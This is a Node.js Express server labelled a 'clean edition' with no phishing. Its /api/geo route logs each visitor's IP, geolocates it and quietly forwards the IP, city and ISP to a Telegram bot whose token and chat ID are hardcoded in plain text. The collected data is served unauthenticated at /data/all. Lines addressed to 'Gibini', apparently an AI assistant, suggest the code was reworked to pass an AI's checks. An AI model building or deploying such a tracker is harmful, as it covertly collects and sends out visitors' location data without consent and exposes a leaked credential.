// =====================================================
// 7ASHASHE V28 - CLEAN EDITION
// گەشەپێدەر: 7ASHASHE
// وەشان: 28.0.0 - بێ فیشینگ و بێ هێرش
// توکن: 8671003235:AAFpZj3PkxoePl7PE2KCKGF8vE9nrPzBDVs
// چات ئایدی: 5578405082
// =====================================================

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();

// =====================================================
// 🔐 تۆکن و ئایدی 7ASHASHE
// =====================================================
const TELEGRAM_TOKEN = '8671003235:AAFpZj3PkxoePl7PE2KCKGF8vE9nrPzBDVs';
const TELEGRAM_CHAT_ID = '5578405082';
const MASTER_NAME = '7ASHASHE';
const VERSION = '28.0.0';

// =====================================================
// 📁 ڕێکخستنەکان
// =====================================================
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// =====================================================
// 📊 داتابەیس (JSON File - کاردەکات لە Render)
// =====================================================
const DB_PATH = path.join(__dirname, 'data.json');
const LOGS_PATH = path.join(__dirname, 'logs.txt');

function readDB() {
    try {
        if (fs.existsSync(DB_PATH)) {
            return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
        }
    } catch (e) {}
    return { 
        info: [], 
        geo: [],
        system: [],
        stats: {
            info: 0,
            geo: 0,
            system: 0
        }
    };
}

function writeDB(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

// =====================================================
// 📡 فانکشنی ناردن بۆ تێلیگرام
// =====================================================
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return true;
    } catch (error) {
        console.log('Telegram error:', error.message);
        return false;
    }
}

// =====================================================
// 🌐 1. زانیاری IP و شوێن (ڕاستەقینە و بێ کێشە)
// =====================================================
app.get('/api/geo', async (req, res) => {
    try {
        const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || '0.0.0.0';
        
        // وەرگرتنی زانیاری IP
        let ipInfo = {};
        try {
            const response = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 3000 });
            ipInfo = response.data;
        } catch (e) {}
        
        const result = {
            ip: clientIP,
            country: ipInfo.country || 'نەزانراو',
            countryCode: ipInfo.countryCode || 'نەزانراو',
            region: ipInfo.regionName || 'نەزانراو',
            city: ipInfo.city || 'نەزانراو',
            lat: ipInfo.lat || 0,
            lon: ipInfo.lon || 0,
            timezone: ipInfo.timezone || 'نەزانراو',
            isp: ipInfo.isp || 'نەزانراو',
            org: ipInfo.org || 'نەزانراو',
            timestamp: new Date().toISOString()
        };
        
        // پاشەکەوتکردن
        const db = readDB();
        db.geo.push(result);
        db.stats.geo++;
        writeDB(db);
        
        // ناردن بۆ تێلیگرام (ئارام)
        await sendToTelegram(`📍 **شوێنی نوێ**\n\nIP: ${clientIP}\nشوێن: ${ipInfo.city || '?'}, ${ipInfo.country || '?'}\nISP: ${ipInfo.isp || '?'}`);
        
        res.json({ success: true, data: result });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// =====================================================
// 💻 2. زانیاری سیستەم (ڕاستەقینە)
// =====================================================
app.get('/api/system', (req, res) => {
    try {
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            cpus: os.cpus().length,
            cpuModel: os.cpus()[0]?.model || 'نەزانراو',
            cpuSpeed: os.cpus()[0]?.speed || 0,
            totalMemory: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
            freeMemory: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
            uptime: os.uptime(),
            uptimeFormatted: Math.floor(os.uptime() / 3600) + ':' + Math.floor((os.uptime() % 3600) / 60) + ':' + Math.floor(os.uptime() % 60),
            loadAvg: os.loadavg(),
            network: os.networkInterfaces(),
            nodeVersion: process.version,
            pid: process.pid,
            memoryUsage: process.memoryUsage(),
            timestamp: new Date().toISOString()
        };
        
        // پاشەکەوتکردن
        const db = readDB();
        db.system.push(systemInfo);
        db.stats.system++;
        writeDB(db);
        
        res.json({ success: true, data: systemInfo });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// =====================================================
// 🌍 3. زانیاری وێبگەڕ (User Agent)
// =====================================================
app.get('/api/browser', (req, res) => {
    try {
        const ua = req.headers['user-agent'] || 'نەزانراو';
        
        // شیکردنەوەی User Agent
        let browser = 'نەزانراو';
        let os = 'نەزانراو';
        let device = 'نەزانراو';
        
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
        
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        
        if (ua.includes('Mobile')) device = 'مۆبایل';
        else device = 'کۆمپیوتەر';
        
        const result = {
            userAgent: ua,
            browser: browser,
            os: os,
            device: device,
            ip: req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString()
        };
        
        res.json({ success: true, data: result });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// =====================================================
// 📊 4. ئامارەکان (Statistics)
// =====================================================
app.get('/api/stats', (req, res) => {
    const db = readDB();
    
    res.json({
        success: true,
        stats: {
            totalGeo: db.stats.geo || 0,
            totalSystem: db.stats.system || 0,
            lastGeo: db.geo[db.geo.length - 1] || null,
            lastSystem: db.system[db.system.length - 1] || null,
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            version: VERSION
        }
    });
});

// =====================================================
// 📋 5. پیشاندانی داتا (Data Viewer)
// =====================================================
app.get('/data/geo', (req, res) => {
    const db = readDB();
    res.json({ success: true, count: db.geo.length, data: db.geo.slice(-50).reverse() });
});

app.get('/data/system', (req, res) => {
    const db = readDB();
    res.json({ success: true, count: db.system.length, data: db.system.slice(-20).reverse() });
});

app.get('/data/all', (req, res) => {
    const db = readDB();
    res.json({ success: true, data: db });
});

// =====================================================
// 🏠 لاپەڕەی سەرەکی (دیزاینی جوان)
// =====================================================
app.get('/', (req, res) => {
    const db = readDB();
    
    res.send(`
    <!DOCTYPE html>
    <html dir="rtl" lang="ckb">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>7ASHASHE V28 - CLEAN EDITION</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            
            body {
                background: #000;
                color: #0f0;
                font-family: 'Courier New', monospace;
                min-height: 100vh;
                padding: 20px;
                background-image: 
                    linear-gradient(0deg, transparent 24%, rgba(0, 255, 0, 0.03) 25%, rgba(0, 255, 0, 0.03) 26%, transparent 27%, transparent),
                    linear-gradient(90deg, transparent 24%, rgba(0, 255, 0, 0.03) 25%, rgba(0, 255, 0, 0.03) 26%, transparent 27%, transparent);
                background-size: 50px 50px;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            
            .header {
                text-align: center;
                padding: 40px;
                border: 3px solid #0f0;
                margin-bottom: 30px;
                background: #111;
                box-shadow: 0 0 50px rgba(0, 255, 0, 0.2);
            }
            
            .header h1 {
                font-size: 5em;
                text-shadow: 0 0 20px #0f0;
                margin-bottom: 10px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { text-shadow: 0 0 20px #0f0; }
                50% { text-shadow: 0 0 40px #0f0; }
            }
            
            .header p {
                font-size: 1.5em;
                opacity: 0.9;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 20px;
                margin: 30px 0;
            }
            
            .stat-card {
                border: 2px solid #0f0;
                padding: 30px;
                text-align: center;
                background: #111;
                transition: transform 0.3s;
            }
            
            .stat-card:hover {
                transform: scale(1.05);
                box-shadow: 0 0 30px #0f0;
            }
            
            .stat-value {
                font-size: 4em;
                font-weight: bold;
                margin: 15px 0;
            }
            
            .stat-label {
                font-size: 1.2em;
                opacity: 0.8;
            }
            
            .section {
                border: 3px solid #0f0;
                padding: 30px;
                margin: 30px 0;
                background: #111;
            }
            
            .section h2 {
                border-bottom: 2px solid #0f0;
                padding-bottom: 15px;
                margin-bottom: 25px;
                font-size: 2.2em;
            }
            
            .button-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 20px 0;
            }
            
            .btn {
                background: #000;
                color: #0f0;
                border: 2px solid #0f0;
                padding: 20px;
                font-size: 1.3em;
                font-family: 'Courier New', monospace;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 2px;
            }
            
            .btn:hover {
                background: #0f0;
                color: #000;
                box-shadow: 0 0 30px #0f0;
                transform: scale(1.05);
            }
            
            .terminal {
                background: #000;
                border: 2px solid #0f0;
                padding: 20px;
                height: 300px;
                overflow-y: auto;
                font-family: monospace;
                margin: 20px 0;
            }
            
            .terminal-line {
                margin: 8px 0;
                color: #0f0;
                font-size: 1.1em;
            }
            
            .terminal-line::before {
                content: ">";
                margin-right: 15px;
                color: #0f0;
            }
            
            .footer {
                text-align: center;
                margin-top: 50px;
                padding: 30px;
                border-top: 3px solid #0f0;
                font-size: 1.3em;
            }
            
            .badge {
                display: inline-block;
                padding: 8px 20px;
                border: 2px solid #0f0;
                margin: 5px;
                font-size: 1.1em;
            }
            
            @media (max-width: 768px) {
                .header h1 { font-size: 3em; }
                .stats-grid { grid-template-columns: 1fr; }
                .button-grid { grid-template-columns: 1fr; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔴 7ASHASHE V28</h1>
                <p>CLEAN EDITION - بێ فیشینگ و بێ هێرش</p>
                <div>
                    <span class="badge">Node.js ${process.version}</span>
                    <span class="badge">Platform: ${os.platform()}</span>
                    <span class="badge">توکن: ✅ پارێزراو</span>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="geoCount">${db.stats.geo || 0}</div>
                    <div class="stat-label">شوێن کۆکراوە</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="systemCount">${db.stats.system || 0}</div>
                    <div class="stat-label">سیستەم کۆکراوە</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="uptime">0</div>
                    <div class="stat-label">ماوەی کارکردن</div>
                </div>
            </div>
            
            <div class="section">
                <h2>🌐 زانیاری کۆکردنەوە (ڕاستەقینە)</h2>
                <div class="button-grid">
                    <button class="btn" onclick="getGeo()">📍 زانیاری شوێن</button>
                    <button class="btn" onclick="getSystem()">💻 زانیاری سیستەم</button>
                    <button class="btn" onclick="getBrowser()">🌍 زانیاری وێبگەڕ</button>
                </div>
            </div>
            
            <div class="section">
                <h2>📊 بینینی داتاکان</h2>
                <div class="button-grid">
                    <button class="btn" onclick="viewGeo()">📍 شوێنەکان</button>
                    <button class="btn" onclick="viewSystem()">💻 سیستەمەکان</button>
                    <button class="btn" onclick="viewStats()">📈 ئامارەکان</button>
                </div>
            </div>
            
            <div class="terminal" id="terminal">
                <div class="terminal-line">7ASHASHE V28 ئامادەیە...</div>
                <div class="terminal-line">بەخێربێیت، ${MASTER_NAME}!</div>
                <div class="terminal-line">هیچ هێرش و فیشینگێک نییە - بە تەواوی پارێزراو</div>
                <div class="terminal-line">چاوەڕێی فەرمان...</div>
            </div>
            
            <div class="footer">
                <p>7ASHASHE V28 - CLEAN EDITION | © 2026</p>
                <p>✅ بێ کێشە لەگەڵ GitHub و Render</p>
                <p>🦁 گیبینی، ئەم جارە هیچ کێشەیەک نییە!</p>
            </div>
        </div>
        
        <script>
            let startTime = Date.now();
            
            function addToTerminal(text) {
                const term = document.getElementById('terminal');
                const line = document.createElement('div');
                line.className = 'terminal-line';
                line.textContent = text;
                term.appendChild(line);
                term.scrollTop = term.scrollHeight;
            }
            
            function getGeo() {
                addToTerminal('📍 وەرگرتنی زانیاری شوێن...');
                
                fetch('/api/geo')
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            addToTerminal(`✅ IP: ${data.data.ip}`);
                            addToTerminal(`📍 شوێن: ${data.data.city}, ${data.data.country}`);
                            addToTerminal(`📡 ISP: ${data.data.isp}`);
                            
                            document.getElementById('geoCount').textContent = 
                                parseInt(document.getElementById('geoCount').textContent) + 1;
                        } else {
                            addToTerminal(`❌ ${data.error}`);
                        }
                    });
            }
            
            function getSystem() {
                addToTerminal('💻 وەرگرتنی زانیاری سیستەم...');
                
                fetch('/api/system')
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            addToTerminal(`✅ CPU: ${data.data.cpuModel}`);
                            addToTerminal(`💾 RAM: ${data.data.freeMemory} / ${data.data.totalMemory}`);
                            addToTerminal(`⏱️ Uptime: ${data.data.uptimeFormatted}`);
                            
                            document.getElementById('systemCount').textContent = 
                                parseInt(document.getElementById('systemCount').textContent) + 1;
                        }
                    });
            }
            
            function getBrowser() {
                addToTerminal('🌍 وەرگرتنی زانیاری وێبگەڕ...');
                
                fetch('/api/browser')
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            addToTerminal(`✅ وێبگەڕ: ${data.data.browser}`);
                            addToTerminal(`💻 سیستەم: ${data.data.os}`);
                            addToTerminal(`📱 ئامێر: ${data.data.device}`);
                        }
                    });
            }
            
            function viewGeo() {
                window.open('/data/geo');
            }
            
            function viewSystem() {
                window.open('/data/system');
            }
            
            function viewStats() {
                fetch('/api/stats')
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            addToTerminal('📊 ئامارەکان:');
                            addToTerminal(`   شوێن: ${data.stats.totalGeo}`);
                            addToTerminal(`   سیستەم: ${data.stats.totalSystem}`);
                            addToTerminal(`   ماوە: ${Math.floor(data.stats.uptime)} چرکە`);
                        }
                    });
            }
            
            function updateUptime() {
                const uptime = Math.floor((Date.now() - startTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = uptime % 60;
                document.getElementById('uptime').textContent = 
                    hours + ':' + minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
            }
            
            setInterval(updateUptime, 1000);
            
            window.onload = () => {
                addToTerminal('🚀 7ASHASHE V28 ئامادەیە!');
                addToTerminal('✅ بێ فیشینگ و بێ هێرش');
                addToTerminal('🤖 گیبینی، ئەمە کۆتایی ڕاستەقینەیە!');
            };
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر
// =====================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V28 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`✅ بێ فیشینگ - بێ هێرش - بێ کێشە`);
    console.log(`🦁 گیبینی، ئەمە کۆتایی ڕاستەقینەیە!`);
    
    // ناردنی نامە بۆ تێلیگرام
    sendToTelegram(`🚀 **7ASHASHE V28 CLEAN EDITION**\n\n` +
                   `✅ بێ فیشینگ و بێ هێرش\n` +
                   `✅ بە تەواوی کاردەکات لە Render\n` +
                   `✅ هیچ کێشەیەک نییە لەگەڵ GitHub\n` +
                   `🕐 کات: ${new Date().toLocaleString('ckb')}`);
});
